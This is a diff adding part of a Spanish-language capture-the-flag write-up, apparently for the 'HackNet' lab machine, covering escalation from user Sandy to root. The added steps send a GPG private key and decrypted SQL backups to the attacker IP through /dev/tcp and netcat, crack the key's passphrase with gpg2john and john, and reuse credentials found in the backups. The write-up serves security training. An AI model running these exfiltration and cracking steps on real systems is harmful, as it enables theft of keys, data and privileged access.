@@ -248,6 +248,134 @@ rm -rf ./* && python3 serializer.py 1f0acfe7480a469402f1852f8313db86.djcache 90d
 
 <img width="2547" height="461" alt="image" src="https://github.com/user-attachments/assets/eb347af7-fc15-47a3-a9da-5cc48860d4a7" />
 
+### User Sandy
+
+Hacemos un tratamiento de la tty para tener una shell mas controlable y vemos que en el directorio actual tenemos un backup
+
+<img width="1276" height="311" alt="image" src="https://github.com/user-attachments/assets/3eba8a94-d37e-4416-8196-7bed556ca025" />
+
+* aunque son nuestros los archivos no podemos leerlos ya que estan encriptados con `gpg` asi que vamos a nuestro directorio de trabajo
+
+
+<img width="1276" height="337" alt="image" src="https://github.com/user-attachments/assets/e01fd955-d77d-4e84-9678-07e36a30a33e" />
+
+* Nos conseguimos con el directorio `.gnupg` el cual puede estar relacionado con los archivos backup anteriores asi que accedemos y revisamos su contenido
+
+  
+<img width="1276" height="337" alt="image" src="https://github.com/user-attachments/assets/9a383a26-ef7b-44b7-90f5-315e2ffa9441" />
+
+* Ya por aqui vemos que tenemos archivos sensibles y los cuales nos permitirian desencriptar los archivos backup anteriores, lo primero que haremos sera enviar el archivo `armored_key.asc` a nuestra maquina atacante para intentar crackear la password, si lo llegamos a lograr entonces podriamos desencriptar los backup.
+
+* en nuestra maquina
+
+```bash
+nc -lnvp 5555 > armored_key.asc
+```
+
+* Ahora enviamos el archivos
+
+```bash
+cat armored_key.asc > /dev/tcp/10.10.14.216/5555
+```
+* Hemos recibido el archivo asi que ahora intentamos crackear desde nuestra maquina
+
+```bash
+gpg2john armored_key.asc > key.hash # extraemos el hash
+```
+```bash
+john -w=/usr/share/wordlists/rockyou.txt key.hash # intentamos crackearlo
+```
+```bash
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65011712 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+s**********rt       (Sandy)     
+1g 0:00:00:01 DONE (2025-09-20 14:28) 0.7194g/s 310.7p/s 310.7c/s 310.7C/s gandako..nicole1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+obtuvimos la password asi que ahora vamos intentar descifrar los backups
+
+### Descifrado GPG
+
+* prmiero vamos abrir 3 listener en nuestra maquina para recibir cada archivo desencriptado
+
+```bash
+nc -lnvp 5555 > back1.txt
+```
+```bash
+nc -lnvp 5556 > back2.txt
+```
+```bash
+nc -lnvp 5557 > back3.txt
+```
+
+* vamos importar la key, desencriptamos y enviamos a nuestra maquina
+
+```bash
+gpg --import private-keys-v1.d/armored_key.asc # importamos la key
+```
+
+```bash
+gpg -o /tmp/back1.txt -d /var/www/HackNet/backups/backup01.sql.gpg && cat /tmp/back1.txt > /dev/tcp/10.10.14.216/5555 && rm -rf /tmp/back1.txt # desencriptamos y enviamos el primer backup
+```
+```bash
+gpg --import private-keys-v1.d/armored_key.asc # importamos la key de nuevo
+```
+```bash
+gpg -o /tmp/back2.txt -d /var/www/HackNet/backups/backup02.sql.gpg && cat /tmp/back2.txt > /dev/tcp/10.10.14.216/5556 && rm -rf /tmp/back2.txt # desencriptamos y enviamos el segundo backup
+```
+```bash
+gpg --import private-keys-v1.d/armored_key.asc # importamos la key
+```
+```bash
+gpg -o /tmp/back3.txt -d /var/www/HackNet/backups/backup03.sql.gpg && cat /tmp/back3.txt > /dev/tcp/10.10.14.216/5556 && rm -rf /tmp/back3.txt # desencriptamos y enviamos el tercer backup
+```
+
+>>> Nota: cada vez que desencriptemos nos pedira una password, esa password es la que obtuvimos al crackear el archivo `armored_key.asc`
+
+* ya tenemos los 3 archivos en nuestra maquina
+
+
+<img width="1276" height="337" alt="image" src="https://github.com/user-attachments/assets/bbcb637a-219b-4b4f-aacf-478d9ceab116" />
+
+* ahora vamos a realizar filtrados para ver si obtenemos credenciales
+
+<img width="1600" height="322" alt="image (3)" src="https://github.com/user-attachments/assets/fc4f41cb-8abd-4776-8c05-680bf1e4fa08" />
+
+intentamos escalar a root
+
+```bash
+su root
+```
+<img width="1268" height="220" alt="image" src="https://github.com/user-attachments/assets/c271247f-ddf1-45d1-ad91-38ee9aa6d0ec" />
+
+
+### User Root
+
+Vamos hasta el directorio root y obtenemos la flag!!!
+
+<img width="1268" height="220" alt="image (4)" src="https://github.com/user-attachments/assets/95629f0c-d8f9-42ab-a324-82b4934dc30a" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
